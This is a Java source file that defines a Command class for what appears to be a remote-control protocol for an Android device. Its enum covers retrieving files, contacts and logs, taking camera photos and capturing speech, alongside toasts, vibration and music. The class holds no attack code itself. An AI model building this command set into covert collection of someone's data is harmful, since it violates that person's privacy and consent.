package com.aei.network;

public class Command {
    public enum CommandType{
        GET_FILE, FILE, TOAST, GET_CONTACTS, CONTACTS, GET_LOG, LOG, PLAY_MUSIC, STOP_MUSIC, VIBRATE,
        GET_FILE_LIST, FILE_LIST, FRONT_CAMERA, BACK_CAMERA, PHOTO, START_SPEECH, STOP_SPEECH, SPEECH,
        ADV
    }
    private CommandType type;
    private String payload;

    public CommandType getType() {
        return type;
    }

    public Command setType(CommandType type) {
        this.type = type;
        return this;
    }

    public String getPayload() {
        return payload;
    }

    public Command setPayload(String payload) {
        this.payload = payload;
        return this;
    }
}
